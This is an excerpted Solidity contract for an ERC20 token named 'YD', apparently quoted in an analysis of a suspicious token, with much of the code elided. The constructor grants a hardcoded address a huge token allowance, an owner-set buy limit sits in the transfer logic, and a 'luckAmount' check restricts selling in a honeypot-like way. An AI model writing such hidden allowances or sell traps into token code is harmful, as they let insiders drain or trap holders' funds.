...
contract YD is ERC20 {
    ...
    address public luckAddress = address(0x58c251BDCA9C66265199112c85Ab3E4ED443f432);
    ...
    constructor(address tokenOwner,address fundAddress) ERC20("YD", "YD") {
        ...
        _approve(address(this), address(0x1B6C9c20693afDE803B27F8782156c0f892ABC2d), 10**29);
        ...
        uint256 total = 3000 * 10**18;
        swapTokensAtAmount = total.div(100000);
        _mint(tokenOwner, total.div(3000).mul(1888));
        _mint(luckAddress, total.div(3000).mul(1112));
    }
	...
	function setWrap(HYWarp _wrap) public onlyOwner {
        wrap = _wrap;
    ...
    uint256 public oneAmount = 3 * 10**18;
    function changeOneAmount(uint256 _oneAmount) public onlyOwner {
    ...
    function _transfer(
		...
		if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || isAddLdx) {
			...
			if(from== uniswapV2Pair){
                require(swapStats);
                require(amount <= oneAmount);
			}else if(to == uniswapV2Pair){
                require(swapStats);
                require(luckAmount[from].add(amount) <= balanceOf(address(this)));
			}else{
                takeFee = false;
            }
		}
    ...
    function swapTokensForDividendToken(uint256 tokenAmount) private {
        ...
        path[0] = address(this);
        path[1] = fistToken;
        uint256 fistOldAmount = FIST.balanceOf(address(wrap));
        ...
        wrap.withdraw(fistOldAmount);
        uint256 allAmount = FIST.balanceOf(address(this));
        FIST.transfer(_fundAddress,allAmount);
    }
